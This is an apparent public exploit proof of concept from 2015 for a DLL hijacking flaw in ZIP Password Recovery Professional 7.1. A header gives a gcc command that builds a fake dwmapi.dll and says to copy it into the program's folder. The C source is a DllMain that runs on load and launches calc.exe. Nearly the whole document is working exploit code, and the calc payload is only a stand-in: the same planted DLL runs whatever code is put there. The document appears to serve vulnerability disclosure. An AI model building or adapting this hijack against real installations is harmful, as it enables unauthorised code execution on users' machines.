/*
#[+] Author: TUNISIAN CYBER
#[+] Exploit Title: ZIP Password Recovery Professional 7.1 DLL Hijacking
#[+] Date: 29-03-2015
#[+] Type: Local Exploits
#[+] Vendor: http://www.recoverlostpassword.com/products/zippasswordrecovery.html#compare
#[+] Tested on: WinXp/Windows 7 Pro
#[+] Friendly Sites: sec4ever.com
#[+] Twitter: @TCYB3R
#[+] gcc -shared -o dwmapi.dll  tcyber.c
# Copy it to the software dir. then execute the software , calc.exe will launch :).
Proof of Concept (PoC):
=======================
*/

#include <windows.h>

int tunisian()
{
WinExec("calc", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
tunisian();
return 0;
}